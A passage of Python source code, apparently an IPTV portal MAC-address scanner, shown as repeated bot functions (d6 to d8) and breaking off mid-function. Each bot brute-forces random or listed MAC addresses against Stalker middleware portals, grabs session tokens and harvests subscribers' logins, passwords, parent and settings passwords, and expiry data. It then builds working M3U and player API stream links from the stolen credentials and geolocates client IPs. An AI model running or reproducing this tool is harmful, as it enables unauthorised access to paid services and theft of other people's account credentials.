                    #     country_name = country_name.split('"')[0]
                    # except:
                    #     pass
                    livelist = ""
                    vodlist = ""
                    serieslist = ""

                    try:
                        url10 = "http://" + panel + "/player_api.php?username=" + user + "&password=" + pas + "&action=get_live_streams"
                        try:
                            res = option.get(url10, timeout=15, verify=False)
                        except OSError as err:
                            print("OS error:", err)
                        except Exception as err:
                            print(f"Unexpected {err}, {type(err)}")
                            raise
                        data = str(res.text)
                        numberofchannels = str(data.count("stream_id"))

                        url11 = "http://" + panel + "/player_api.php?username=" + user + "&password=" + pas + "&action=get_vod_streams"
                        try:
                            res = option.get(url11, timeout=15, verify=False)
                        except OSError as err:
                            print("OS error:", err)
                        except Exception as err:
                            print(f"Unexpected {err}, {type(err)}")
                            raise
                        data = str(res.text)
                        numberofmovies = str(data.count("stream_id"))

                        url12 = http + panel + "/player_api.php?username=" + user + "&password=" + pas + "&action=get_series"
                        try:
                            res = option.get(url12, timeout=15, verify=False)
                        except OSError as err:
                            print("OS error:", err)
                        except Exception as err:
                            print(f"Unexpected {err}, {type(err)}")
                            raise
                        data = str(res.text)
                        numberofseries = str(data.count("series_id"))
                    except:
                        pass
                    # vpn = ""
                    # if not ip == "":
                    #     vpn = vpnip(ip)
                    # else:
                    #     vpn = " No IP Address"

                    if channelcat == "1" or channelcat == "2":
                        listlink = liveurl
                        livel = ' «★» '
                        livelist = list(listlink, macs, token, livel)
                    if channelcat == "2":
                        listlink = vodurl
                        livel = ' «★» '
                        vodlist = list(listlink, macs, token, livel)
                        listlink = seriesurl
                        livel = ' «★️» '
                        serieslist = list(listlink, macs, token, livel)
                    hit(mac, trh, real, m3ulink, m3uhost, m3ustat, state, vpn, livelist, vodlist, serieslist, playerapi,
                        fname, tariff_plan, ls, login, password, tariff_plan_id, bill, expire_billing_date, max_online,
                        parent_password, stb_type, comment, country, settings_password, country_name, scountry,
                        numberofchannels, numberofmovies, numberofseries)


def d6():
    global hitc, numberofchannels, numberofmovies, numberofseries
    global hitr, macv, tokenr, m3ustat
    global bots, m3uvpn, m3uon, macon, macvpn
    global expired_hits_bypassed
    for mac in range(6, mactrys, numbots):
        login = ""
        parent_password = ""
        password = ""
        stb_type = ""
        tariff_plan_id = ""
        comment = ""
        country = ""
        settings_password = ""
        expire_billing_date = ""
        max_online = ""
        expires = ""
        ls = ""
        fname = ""
        tariff_plan = ""
        bill = ""
        numberofchannels = "0"
        numberofmovies = "0"
        numberofseries = "0"
        livelist = ""
        vodlist = ""
        serieslist = ""
        playerapi = ""
        state = " 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐎𝐩𝐩𝐬"
        vpn = ""
        country_name = ""
        scountry = ""
        m3ulink = ""
        m3uhost = ""
        user = ""
        pas = ""
        plink = ""
        real = ""
        total = mac
        if selectcombo == "0":
            mac = randommac()
        else:
            macv = re.search(pattern, totLen[mac], re.IGNORECASE)  # check for matching mac in data
            if macv:
                mac = macv.group()
                mac = mac.upper()
            else:
                continue
        macs = mac.upper().replace(':', '%3A')
        bot = "Bot_06"
        oran = ""
        oran = round((total / mactrys * 100), 2)
        trys = 0
        data = ""
        while True:
            try:
                res = option.get(url1, headers=hea1(macs), timeout=15, verify=False)  # get to
                data = str(res.text)  # retrieve token stored in data
                break
            except:
                trys = trys + 1
                time.sleep(1)  # just some waiting around if they are problems receiving data
                if trys == 12:
                    break
        echok(mac, bot, total, hitr, hitc, status_code, oran, load, panel, tokenr)  # send data outside thread
        tokenr = "\33[35m"  # turn mac code purple if no token in response
        if 'token' in data:
            tokenr = "\33[0m"  # mac code white if token is in response
            token = data.replace('{"js":{"token":"', "")
            token = token.split('"')[0]  # separating token data out of the rest of the response
            trys = 0
            while True:
                try:
                    res = option.get(url2, headers=hea2(macs, token), timeout=15, verify=False)
                    data = ""
                    data = str(res.text)
                    break
                except:
                    trys = trys + 1
                    time.sleep(1)
                    if trys == 12:
                        break
            id = "null"
            ip = ""
            country = ""

            try:
                id = data.split('{"js":{"id":')[1]
                id = id.split(',"name')[0]
                ip = data.split('ip":"')[1]
                ip = ip.split('"')[0]
            except:
                pass
            try:
                ip = str(fix_me2(data, "ip"))
            except:
                pass
            try:
                expires = str(fix_me2(data, "expires"))
            except:
                pass
            if id == "null" and expires == "" and ban == "":
                continue

            try:
                if load == "stalker_portal/server/load.php":
                    if 'login":"' in data:
                        login = str(fix_me2(data, "login"))
                        parent_password = str(fix_me2(data, "parent_password"))
                        password = str(fix_me2(data, "password"))
                        stb_type = str(fix_me2(data, "stb_type"))
                        tariff_plan_id = str(fix_me2(data, "tariff_plan_id"))
                        comment = str(fix_me2(data, "comment"))
                        country = str(fix_me2(data, "country"))
                        settings_password = str(fix_me2(data, "settings_password"))
                        expire_billing_date = str(fix_me2(data, "expire_billing_date"))
                        ls = str(fix_me2(data, "ls"))
                        try:
                            max_online = str(fix_me2(data, "max_online"))
                        except:
                            max_online = ""
            except:
                pass
            if not id == "null":
                trys = 0
                while True:
                    try:
                        res = option.get(url3, headers=hea2(macs, token), timeout=15, verify=False)
                        data = ""
                        data = str(res.text)
                        break
                    except:
                        trys = trys + 1
                        time.sleep(1)
                        if trys == 12:
                            break
                if not data.count('phone') == 0:
                    hitr = "\33[1;36m"
                    hitc = hitc + 1
                    trh = ""
                    fname = ""
                    ls = ""
                    tariff_plan = ""
                    bill = ""
                    if load == "stalker_portal/server/load.php":
                        try:
                            fname = str(fix_me2(data, "fname"))
                        except:
                            pass
                        try:
                            tariff_plan = str(fix_me2(data, "tariff_plan"))
                        except:
                            pass
                        try:
                            bill = str(fix_me2(data, "created"))
                        except:
                            pass
                    if "phone" in data:
                        trh = str(fix_me2(data, "phone"))
                    if 'end_date' in data:
                        trh = data.split('end_date":"')[1]
                        trh = trh.split('"')[0]
                    else:
                        try:
                            trh = data.split('phone":"')[1]
                            trh = trh.split('"')[0]

                            if trh.lower()[:2] == 'un':
                                remainingdays = "∞ Days"
                                trh = trh + ' ' + remainingdays
                            else:
                                days_left = days_clear(trh)
                                if days_left is None or days_left <= 0:
                                    expired_hits_bypassed += 1
                                    print(f"\n\033[91mExpired Hit Passed: MAC {mac} - Expiry: {trh}\033[0m")
                                    hitc = hitc - 1 if hitc > 0 else 0
                                    hitr = "\33[1;33m"
                                    continue

                                remainingdays = str(days_left) + " Days"
                                trh = trh + ' ' + remainingdays
                        except Exception as e:
                            print(f"\033[93mDate Processing Error: {e}\033[0m")
                            continue

                    hitprint(mac, trh)
                    trys = 0
                    while True:
                        try:
                            res = option.get(url6, headers=hea2(macs, token), timeout=10, verify=False)
                            data = ""
                            data = str(res.text)
                            cid = ""
                            cid = (str(res.text).split('ch_id":"')[5].split('"')[0])
                            # print(cid)
                            break
                        except:
                            trys = trys + 1
                            time.sleep(1)
                            if trys == 10:
                                # quit()
                                cid = "94067"
                                break
                    real = panel
                    m3ulink = ""
                    m3uhost = ""
                    user = ""
                    pas = ""
                    plink = ""  # Initialize plink here
                    state = " 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐎𝐩𝐩𝐬"

                    trys = 0
                    while True:
                        try:
                            res = option.get(url(cid), headers=hea2(macs, token), timeout=15, verify=False)
                            data = ""
                            data = str(res.text)
                            link = data.split('ffmpeg ')[1].split('"')[0].replace(r'\/', '/')
                            user = login
                            real = '' + link.split('://')[1].split('/')[0] + '/c/'
                            user = str(link.replace('live/', '').split('/')[3])
                            pas = str(link.replace('live/', '').split('/')[4])
                            m3ulink = "http://" + real.replace('http://', '').replace('/c/',
                                                                                      '') + "/get.php?username=" + str(
                                user) + "&password=" + str(pas) + "&type=m3u_plus"
                            m3uhost = "http://" + panel.replace('http://', '').replace('/c/',
                                                                                       '') + "/get.php?username=" + str(
                                user) + "&password=" + str(pas) + "&type=m3u_plus&output=m3u8"
                            state = image(link)
                            break
                        except:
                            trys = trys + 1
                            time.sleep(1)
                            if trys == 12:
                                break

                    playerapi = ""
                    if not m3ulink == "":
                        try:
                            playerlink = (http + real.replace(http, '').replace('/c/',
                                                                                '') + "/player_api.php?username=" + user + "&password=" + pas)
                            plink = real.replace(http, '').replace('/c/', '')  # Define plink here
                            playerapi = m3uapi(playerlink, mac, token)
                            m3ustat = m3ustatus(cid, user, pas, plink)
                        except:
                            pass

                        if playerapi == "":
                            try:
                                playerlink = (http + panel.replace(http, '').replace('/c/',
                                                                                     '') + "/player_api.php?username=" + user + "&password=" + pas)
                                plink = panel.replace(http, '').replace('/c/', '')  # Update plink here
                                playerapi = m3uapi(playerlink, mac, token)
                            except:
                                pass

                    try:
                        m3ustat = m3ustatus(cid, user, pas, plink)
                    except:
                        m3ustat = "Error"
                    if m3ustat == "ⓃⓄ ⒾⓂ︎ⒶⒼⒺ ":
                        m3uvpn = m3uvpn + 1
                    else:
                        m3uon = m3uon + 1
                    if state == "ⓊⓈⒺ ⓋⓅⓃ 🔒 " or state == "Invalid Opps":
                        macvpn = macvpn + 1
                    else:
                        macon = macon + 1
                    SN = (hashlib.md5(mac.encode('utf-8')).hexdigest())
                    SNENC = SN.upper()
                    SNCUT = SNENC[:13]
                    DEV = hashlib.sha256(mac.encode('utf-8')).hexdigest()
                    DEVENC = DEV.upper()
                    SG = SNCUT + '+' + mac
                    SING = (hashlib.sha256(SG.encode('utf-8')).hexdigest())
                    SINGENC = SING.upper()
                    if not ip == "":
                        vpn = vpnip(ip)
                    else:
                        vpn = "ɴᴏ ᴄʟɪᴇɴᴛ ɪᴘ"
                    url5 = "https://ipapi.co/" + ip + "/json/"
                    while True:
                        try:
                            res = option.get(url5, timeout=7, verify=False)
                            break
                        except:
                            trys = trys + 1
                            time.sleep(2)
                            if trys == 4:
                                break
                    try:
                        trys = 0
                        data1 = str(res.text)
                        scountry = ""
                        country_name = "Unavailable 🏴‍☠️"
                        scountry = data1.split('country_code": "')[1]
                        scountry = scountry.split('"')[0]
                        country_name = data1.split('country_name": "')[1]
                        country_name = country_name.split('"')[0]
                        flagc = flag.flag(scountry)
                        if country_name == "":
                            country_name = "Unavailable 🏴‍☠️"
                        else:
                            country_name = country_name + " " + flagc
                        country_name = country_name
                    except:
                        pass

                    # try:
                    #     trys = 0
                    #     data = str(res.text)
                    #     scountry = ""
                    #     country_name = ""
                    #     scountry = data.split('country_code": "')[1]
                    #     scountry = scountry.split('"')[0]
                    #     country_name = data.split('country_name": "')[1]
                    #     country_name = country_name.split('"')[0]
                    # except:
                    #     pass
                    livelist = ""
                    vodlist = ""
                    serieslist = ""

                    try:
                        url10 = "http://" + panel + "/player_api.php?username=" + user + "&password=" + pas + "&action=get_live_streams"
                        try:
                            res = option.get(url10, timeout=15, verify=False)
                        except OSError as err:
                            print("OS error:", err)
                        except Exception as err:
                            print(f"Unexpected {err}, {type(err)}")
                            raise
                        data = str(res.text)
                        numberofchannels = str(data.count("stream_id"))

                        url11 = "http://" + panel + "/player_api.php?username=" + user + "&password=" + pas + "&action=get_vod_streams"
                        try:
                            res = option.get(url11, timeout=15, verify=False)
                        except OSError as err:
                            print("OS error:", err)
                        except Exception as err:
                            print(f"Unexpected {err}, {type(err)}")
                            raise
                        data = str(res.text)
                        numberofmovies = str(data.count("stream_id"))

                        url12 = http + panel + "/player_api.php?username=" + user + "&password=" + pas + "&action=get_series"
                        try:
                            res = option.get(url12, timeout=15, verify=False)
                        except OSError as err:
                            print("OS error:", err)
                        except Exception as err:
                            print(f"Unexpected {err}, {type(err)}")
                            raise
                        data = str(res.text)
                        numberofseries = str(data.count("series_id"))
                    except:
                        pass
                    # vpn = ""
                    # if not ip == "":
                    #     vpn = vpnip(ip)
                    # else:
                    #     vpn = " No IP Address"

                    if channelcat == "1" or channelcat == "2":
                        listlink = liveurl
                        livel = ' «★» '
                        livelist = list(listlink, macs, token, livel)
                    if channelcat == "2":
                        listlink = vodurl
                        livel = ' «★» '
                        vodlist = list(listlink, macs, token, livel)
                        listlink = seriesurl
                        livel = ' «★️» '
                        serieslist = list(listlink, macs, token, livel)
                    hit(mac, trh, real, m3ulink, m3uhost, m3ustat, state, vpn, livelist, vodlist, serieslist, playerapi,
                        fname, tariff_plan, ls, login, password, tariff_plan_id, bill, expire_billing_date, max_online,
                        parent_password, stb_type, comment, country, settings_password, country_name, scountry,
                        numberofchannels, numberofmovies, numberofseries)


def d7():
    global hitc, numberofchannels, numberofmovies, numberofseries
    global hitr, macv, tokenr, m3ustat
    global bots, m3uvpn, m3uon, macon, macvpn
    global expired_hits_bypassed
    for mac in range(7, mactrys, numbots):
        login = ""
        parent_password = ""
        password = ""
        stb_type = ""
        tariff_plan_id = ""
        comment = ""
        country = ""
        settings_password = ""
        expire_billing_date = ""
        max_online = ""
        expires = ""
        ls = ""
        fname = ""
        tariff_plan = ""
        bill = ""
        numberofchannels = "0"
        numberofmovies = "0"
        numberofseries = "0"
        livelist = ""
        vodlist = ""
        serieslist = ""
        playerapi = ""
        state = " 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐎𝐩𝐩𝐬"
        vpn = ""
        country_name = ""
        scountry = ""
        m3ulink = ""
        m3uhost = ""
        user = ""
        pas = ""
        plink = ""
        real = ""
        total = mac
        if selectcombo == "0":
            mac = randommac()
        else:
            macv = re.search(pattern, totLen[mac], re.IGNORECASE)  # check for matching mac in data
            if macv:
                mac = macv.group()
                mac = mac.upper()
            else:
                continue
        macs = mac.upper().replace(':', '%3A')
        bot = "Bot_07"
        oran = ""
        oran = round((total / mactrys * 100), 2)
        trys = 0
        data = ""
        while True:
            try:
                res = option.get(url1, headers=hea1(macs), timeout=15, verify=False)  # get to
                data = str(res.text)  # retrieve token stored in data
                break
            except:
                trys = trys + 1
                time.sleep(1)  # just some waiting around if they are problems receiving data
                if trys == 12:
                    break
        echok(mac, bot, total, hitr, hitc, status_code, oran, load, panel, tokenr)  # send data outside thread
        tokenr = "\33[35m"  # turn mac code purple if no token in response
        if 'token' in data:
            tokenr = "\33[0m"  # mac code white if token is in response
            token = data.replace('{"js":{"token":"', "")
            token = token.split('"')[0]  # separating token data out of the rest of the response
            trys = 0
            while True:
                try:
                    res = option.get(url2, headers=hea2(macs, token), timeout=15, verify=False)
                    data = ""
                    data = str(res.text)
                    break
                except:
                    trys = trys + 1
                    time.sleep(1)
                    if trys == 12:
                        break
            id = "null"
            ip = ""
            country = ""

            try:
                id = data.split('{"js":{"id":')[1]
                id = id.split(',"name')[0]
                ip = data.split('ip":"')[1]
                ip = ip.split('"')[0]
            except:
                pass
            try:
                ip = str(fix_me2(data, "ip"))
            except:
                pass
            try:
                expires = str(fix_me2(data, "expires"))
            except:
                pass
            if id == "null" and expires == "" and ban == "":
                continue

            try:
                if load == "stalker_portal/server/load.php":
                    if 'login":"' in data:
                        login = str(fix_me2(data, "login"))
                        parent_password = str(fix_me2(data, "parent_password"))
                        password = str(fix_me2(data, "password"))
                        stb_type = str(fix_me2(data, "stb_type"))
                        tariff_plan_id = str(fix_me2(data, "tariff_plan_id"))
                        comment = str(fix_me2(data, "comment"))
                        country = str(fix_me2(data, "country"))
                        settings_password = str(fix_me2(data, "settings_password"))
                        expire_billing_date = str(fix_me2(data, "expire_billing_date"))
                        ls = str(fix_me2(data, "ls"))
                        try:
                            max_online = str(fix_me2(data, "max_online"))
                        except:
                            max_online = ""
            except:
                pass
            if not id == "null":
                trys = 0
                while True:
                    try:
                        res = option.get(url3, headers=hea2(macs, token), timeout=15, verify=False)
                        data = ""
                        data = str(res.text)
                        break
                    except:
                        trys = trys + 1
                        time.sleep(1)
                        if trys == 12:
                            break
                if not data.count('phone') == 0:
                    hitr = "\33[1;36m"
                    hitc = hitc + 1
                    trh = ""
                    fname = ""
                    ls = ""
                    tariff_plan = ""
                    bill = ""
                    if load == "stalker_portal/server/load.php":
                        try:
                            fname = str(fix_me2(data, "fname"))
                        except:
                            pass
                        try:
                            tariff_plan = str(fix_me2(data, "tariff_plan"))
                        except:
                            pass
                        try:
                            bill = str(fix_me2(data, "created"))
                        except:
                            pass
                    if "phone" in data:
                        trh = str(fix_me2(data, "phone"))
                    if 'end_date' in data:
                        trh = data.split('end_date":"')[1]
                        trh = trh.split('"')[0]
                    else:
                        try:
                            trh = data.split('phone":"')[1]
                            trh = trh.split('"')[0]

                            if trh.lower()[:2] == 'un':
                                remainingdays = "∞ Days"
                                trh = trh + ' ' + remainingdays
                            else:
                                days_left = days_clear(trh)
                                if days_left is None or days_left <= 0:
                                    expired_hits_bypassed += 1
                                    print(f"\n\033[91mExpired Hit Passed: MAC {mac} - Expiry: {trh}\033[0m")
                                    hitc = hitc - 1 if hitc > 0 else 0
                                    hitr = "\33[1;33m"
                                    continue

                                remainingdays = str(days_left) + " Days"
                                trh = trh + ' ' + remainingdays
                        except Exception as e:
                            print(f"\033[93mDate Processing Error: {e}\033[0m")
                            continue

                    hitprint(mac, trh)
                    trys = 0
                    while True:
                        try:
                            res = option.get(url6, headers=hea2(macs, token), timeout=10, verify=False)
                            data = ""
                            data = str(res.text)
                            cid = ""
                            cid = (str(res.text).split('ch_id":"')[5].split('"')[0])
                            # print(cid)
                            break
                        except:
                            trys = trys + 1
                            time.sleep(1)
                            if trys == 10:
                                # quit()
                                cid = "94067"
                                break
                    real = panel
                    m3ulink = ""
                    m3uhost = ""
                    user = ""
                    pas = ""
                    plink = ""  # Initialize plink here
                    state = " 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐎𝐩𝐩𝐬"

                    trys = 0
                    while True:
                        try:
                            res = option.get(url(cid), headers=hea2(macs, token), timeout=15, verify=False)
                            data = ""
                            data = str(res.text)
                            link = data.split('ffmpeg ')[1].split('"')[0].replace(r'\/', '/')
                            user = login
                            real = '' + link.split('://')[1].split('/')[0] + '/c/'
                            user = str(link.replace('live/', '').split('/')[3])
                            pas = str(link.replace('live/', '').split('/')[4])
                            m3ulink = "http://" + real.replace('http://', '').replace('/c/',
                                                                                      '') + "/get.php?username=" + str(
                                user) + "&password=" + str(pas) + "&type=m3u_plus"
                            m3uhost = "http://" + panel.replace('http://', '').replace('/c/',
                                                                                       '') + "/get.php?username=" + str(
                                user) + "&password=" + str(pas) + "&type=m3u_plus&output=m3u8"
                            state = image(link)
                            break
                        except:
                            trys = trys + 1
                            time.sleep(1)
                            if trys == 12:
                                break

                    playerapi = ""
                    if not m3ulink == "":
                        try:
                            playerlink = (http + real.replace(http, '').replace('/c/',
                                                                                '') + "/player_api.php?username=" + user + "&password=" + pas)
                            plink = real.replace(http, '').replace('/c/', '')  # Define plink here
                            playerapi = m3uapi(playerlink, mac, token)
                            m3ustat = m3ustatus(cid, user, pas, plink)
                        except:
                            pass

                        if playerapi == "":
                            try:
                                playerlink = (http + panel.replace(http, '').replace('/c/',
                                                                                     '') + "/player_api.php?username=" + user + "&password=" + pas)
                                plink = panel.replace(http, '').replace('/c/', '')  # Update plink here
                                playerapi = m3uapi(playerlink, mac, token)
                            except:
                                pass

                    try:
                        m3ustat = m3ustatus(cid, user, pas, plink)
                    except:
                        m3ustat = "Error"
                    if m3ustat == "ⓃⓄ ⒾⓂ︎ⒶⒼⒺ ":
                        m3uvpn = m3uvpn + 1
                    else:
                        m3uon = m3uon + 1
                    if state == "ⓊⓈⒺ ⓋⓅⓃ 🔒 " or state == "Invalid Opps":
                        macvpn = macvpn + 1
                    else:
                        macon = macon + 1
                    SN = (hashlib.md5(mac.encode('utf-8')).hexdigest())
                    SNENC = SN.upper()
                    SNCUT = SNENC[:13]
                    DEV = hashlib.sha256(mac.encode('utf-8')).hexdigest()
                    DEVENC = DEV.upper()
                    SG = SNCUT + '+' + mac
                    SING = (hashlib.sha256(SG.encode('utf-8')).hexdigest())
                    SINGENC = SING.upper()
                    if not ip == "":
                        vpn = vpnip(ip)
                    else:
                        vpn = "ɴᴏ ᴄʟɪᴇɴᴛ ɪᴘ"
                    url5 = "https://ipapi.co/" + ip + "/json/"
                    while True:
                        try:
                            res = option.get(url5, timeout=7, verify=False)
                            break
                        except:
                            trys = trys + 1
                            time.sleep(2)
                            if trys == 4:
                                break
                    try:
                        trys = 0
                        data1 = str(res.text)
                        scountry = ""
                        country_name = "Unavailable 🏴‍☠️"
                        scountry = data1.split('country_code": "')[1]
                        scountry = scountry.split('"')[0]
                        country_name = data1.split('country_name": "')[1]
                        country_name = country_name.split('"')[0]
                        flagc = flag.flag(scountry)
                        if country_name == "":
                            country_name = "Unavailable 🏴‍☠️"
                        else:
                            country_name = country_name + " " + flagc
                        country_name = country_name
                    except:
                        pass

                    # try:
                    #     trys = 0
                    #     data = str(res.text)
                    #     scountry = ""
                    #     country_name = ""
                    #     scountry = data.split('country_code": "')[1]
                    #     scountry = scountry.split('"')[0]
                    #     country_name = data.split('country_name": "')[1]
                    #     country_name = country_name.split('"')[0]
                    # except:
                    #     pass
                    livelist = ""
                    vodlist = ""
                    serieslist = ""

                    try:
                        url10 = "http://" + panel + "/player_api.php?username=" + user + "&password=" + pas + "&action=get_live_streams"
                        try:
                            res = option.get(url10, timeout=15, verify=False)
                        except OSError as err:
                            print("OS error:", err)
                        except Exception as err:
                            print(f"Unexpected {err}, {type(err)}")
                            raise
                        data = str(res.text)
                        numberofchannels = str(data.count("stream_id"))

                        url11 = "http://" + panel + "/player_api.php?username=" + user + "&password=" + pas + "&action=get_vod_streams"
                        try:
                            res = option.get(url11, timeout=15, verify=False)
                        except OSError as err:
                            print("OS error:", err)
                        except Exception as err:
                            print(f"Unexpected {err}, {type(err)}")
                            raise
                        data = str(res.text)
                        numberofmovies = str(data.count("stream_id"))

                        url12 = http + panel + "/player_api.php?username=" + user + "&password=" + pas + "&action=get_series"
                        try:
                            res = option.get(url12, timeout=15, verify=False)
                        except OSError as err:
                            print("OS error:", err)
                        except Exception as err:
                            print(f"Unexpected {err}, {type(err)}")
                            raise
                        data = str(res.text)
                        numberofseries = str(data.count("series_id"))
                    except:
                        pass
                    # vpn = ""
                    # if not ip == "":
                    #     vpn = vpnip(ip)
                    # else:
                    #     vpn = " No IP Address"

                    if channelcat == "1" or channelcat == "2":
                        listlink = liveurl
                        livel = ' «★» '
                        livelist = list(listlink, macs, token, livel)
                    if channelcat == "2":
                        listlink = vodurl
                        livel = ' «★» '
                        vodlist = list(listlink, macs, token, livel)
                        listlink = seriesurl
                        livel = ' «★️» '
                        serieslist = list(listlink, macs, token, livel)
                    hit(mac, trh, real, m3ulink, m3uhost, m3ustat, state, vpn, livelist, vodlist, serieslist, playerapi,
                        fname, tariff_plan, ls, login, password, tariff_plan_id, bill, expire_billing_date, max_online,
                        parent_password, stb_type, comment, country, settings_password, country_name, scountry,
                        numberofchannels, numberofmovies, numberofseries)


def d8():
    global hitc, numberofchannels, numberofmovies, numberofseries
    global hitr, macv, tokenr, m3ustat
    global bots, m3uvpn, m3uon, macon, macvpn
    global expired_hits_bypassed
    for mac in range(8, mactrys, numbots):
        login = ""
        parent_password = ""
        password = ""
        stb_type = ""
        tariff_plan_id = ""
        comment = ""
        country = ""
        settings_password = ""
        expire_billing_date = ""
        max_online = ""
        expires = ""
        ls = ""
        fname = ""
        tariff_plan = ""
        bill = ""
        numberofchannels = "0"
        numberofmovies = "0"
        numberofseries = "0"
        livelist = ""
        vodlist = ""
        serieslist = ""
        playerapi = ""
        state = " 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐎𝐩𝐩𝐬"
        vpn = ""
        country_name = ""
        scountry = ""
        m3ulink = ""
        m3uhost = ""
        user = ""
        pas = ""
        plink = ""
        real = ""
        total = mac
        if selectcombo == "0":
            mac = randommac()
        else:
            macv = re.search(pattern, totLen[mac], re.IGNORECASE)  # check for matching mac in data
            if macv:
                mac = macv.group()
                mac = mac.upper()
            else:
                continue
        macs = mac.upper().replace(':', '%3A')
        bot = "Bot_08"
        oran = ""
        oran = round((total / mactrys * 100), 2)
        trys = 0
        data = ""
        while True:
            try:
                res = option.get(url1, headers=hea1(macs), timeout=15, verify=False)  # get to
                data = str(res.text)  # retrieve token stored in data
                break
            except:
                trys = trys + 1
                time.sleep(1)  # just some waiting around if they are problems receiving data
                if trys == 12:
                    break
        echok(mac, bot, total, hitr, hitc, status_code, oran, load, panel, tokenr)  # send data outside thread
        tokenr = "\33[35m"  # turn mac code purple if no token in response
        if 'token' in data:
            tokenr = "\33[0m"  # mac code white if token is in response
            token = data.replace('{"js":{"token":"', "")
            token = token.split('"')[0]  # separating token data out of the rest of the response
            trys = 0
            while True:
                try:
                    res = option.get(url2, headers=hea2(macs, token), timeout=15, verify=False)
                    data = ""
                    data = str(res.text)
                    break
                except:
                    trys = trys + 1
                    time.sleep(1)
                    if trys == 12:
                        break
            id = "null"
            ip = ""
            country = ""

            try:
                id = data.split('{"js":{"id":')[1]
                id = id.split(',"name')[0]
                ip = data.split('ip":"')[1]
                ip = ip.split('"')[0]
            except:
                pass
            try:
                ip = str(fix_me2(data, "ip"))
            except:
                pass
            try:
                expires = str(fix_me2(data, "expires"))
            except:
                pass
            if id == "null" and expires == "" and ban == "":
                continue

            try:
                if load == "stalker_portal/server/load.php":
                    if 'login":"' in data:
                        login = str(fix_me2(data, "login"))
                        parent_password = str(fix_me2(data, "parent_password"))
                        password = str(fix_me2(data, "password"))
                        stb_type = str(fix_me2(data, "stb_type"))
                        tariff_plan_id = str(fix_me2(data, "tariff_plan_id"))
                        comment = str(fix_me2(data, "comment"))
                        country = str(fix_me2(data, "country"))
                        settings_password = str(fix_me2(data, "settings_password"))
                        expire_billing_date = str(fix_me2(data, "expire_billing_date"))
                        ls = str(fix_me2(data, "ls"))
                        try:
                            max_online = str(fix_me2(data, "max_online"))
                        except:
                            max_online = ""
            except:
                pass
            if not id == "null":
                trys = 0
                while True:
                    try:
                        res = option.get(url3, headers=hea2(macs, token), timeout=15, verify=False)
                        data = ""
                        data = str(res.text)
                        break
                    except:
                        trys = trys + 1
                        time.sleep(1)
                        if trys == 12:
                            break
                if not data.count('phone') == 0:
                    hitr = "\33[1;36m"
                    hitc = hitc + 1
                    trh = ""
                    fname = ""
                    ls = ""
                    tariff_plan = ""
                    bill = ""
                    if load == "stalker_portal/server/load.php":
                        try:
                            fname = str(fix_me2(data, "fname"))
                        except:
                            pass
                        try:
                            tariff_plan = str(fix_me2(data, "tariff_plan"))
                        except:
                            pass
                        try:
                            bill = str(fix_me2(data, "created"))
                        except:
                            pass
                    if "phone" in data:
                        trh = str(fix_me2(data, "phone"))
                    if 'end_date' in data:
                        trh = data.split('end_date":"')[1]
                        trh = trh.split('"')[0]
                    else:
                        try:
                            trh = data.split('phone":"')[1]
                            trh = trh.split('"')[0]

                            if trh.lower()[:2] == 'un':
                                remainingdays = "∞ Days"
                                trh = trh + ' ' + remainingdays
                            else:
                                days_left = days_clear(trh)
                                if days_left is None or days_left <= 0:
                                    expired_hits_bypassed += 1
                                    print(f"\n\033[91mExpired Hit Passed: MAC {mac} - Expiry: {trh}\033[0m")
                                    hitc = hitc - 1 if hitc > 0 else 0
                                    hitr = "\33[1;33m"
                                    continue

                                remainingdays = str(days_left) + " Days"
                                trh = trh + ' ' + remainingdays
                        except Exception as e:
                            print(f"\033[93mDate Processing Error: {e}\033[0m")
                            continue

                    hitprint(mac, trh)
                    trys = 0
                    while True:
                        try:
                            res = option.get(url6, headers=hea2(macs, token), timeout=10, verify=False)
                            data = ""
                            data = str(res.text)
                            cid = ""
                            cid = (str(res.text).split('ch_id":"')[5].split('"')[0])
                            # print(cid)
                            break
                        except:
                            trys = trys + 1
                            time.sleep(1)
                            if trys == 10:
                                # quit()
                                cid = "94067"
                                break
                    real = panel
                    m3ulink = ""
                    m3uhost = ""
                    user = ""
                    pas = ""
                    plink = ""  # Initialize plink here
                    state = " 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐎𝐩𝐩𝐬"

                    trys = 0
                    while True:
                        try:
                            res = option.get(url(cid), headers=hea2(macs, token), timeout=15, verify=False)
                            data = ""
                            data = str(res.text)
                            link = data.split('ffmpeg ')[1].split('"')[0].replace(r'\/', '/')
                            user = login
                            real = '' + link.split('://')[1].split('/')[0] + '/c/'
                            user = str(link.replace('live/', '').split('/')[3])
                            pas = str(link.replace('live/', '').split('/')[4])
                            m3ulink = "http://" + real.replace('http://', '').replace('/c/',
                                                                                      '') + "/get.php?username=" + str(
                                user) + "&password=" + str(pas) + "&type=m3u_plus"
                            m3uhost = "http://" + panel.replace('http://', '').replace('/c/',
                                                                                       '') + "/get.php?username=" + str(
                                user) + "&password=" + str(pas) + "&type=m3u_plus&output=m3u8"
                            state = image(link)
                            break
                        except:
                            trys = trys + 1
                            time.sleep(1)
                            if trys == 12:
                                break

                    playerapi = ""
                    if not m3ulink == "":
                        try:
                            playerlink = (http + real.replace(http, '').replace('/c/',
                                                                                '') + "/player_api.php?username=" + user + "&password=" + pas)
                            plink = real.replace(http, '').replace('/c/', '')  # Define plink here
                            playerapi = m3uapi(playerlink, mac, token)
                            m3ustat = m3ustatus(cid, user, pas, plink)
                        except:
                            pass

                        if playerapi == "":
                            try:
                                playerlink = (http + panel.replace(http, '').replace('/c/',
                                                                                     '') + "/player_api.php?username=" + user + "&password=" + pas)
                                plink = panel.replace(http, '').replace('/c/', '')  # Update plink here
                                playerapi = m3uapi(playerlink, mac, token)
                            except:
                                pass

                    try:
                        m3ustat = m3ustatus(cid, user, pas, plink)
                    except:
                        m3ustat = "Error"
                    if m3ustat == "ⓃⓄ ⒾⓂ︎ⒶⒼⒺ ":
                        m3uvpn = m3uvpn + 1
                    else:
                        m3uon = m3uon + 1
                    if state == "ⓊⓈⒺ ⓋⓅⓃ 🔒 " or state == "Invalid Opps":
                        macvpn = macvpn + 1
                    else:
                        macon = macon + 1
                    SN = (hashlib.md5(mac.encode('utf-8')).hexdigest())
                    SNENC = SN.upper()
                    SNCUT = SNENC[:13]
                    DEV = hashlib.sha256(mac.encode('utf-8')).hexdigest()
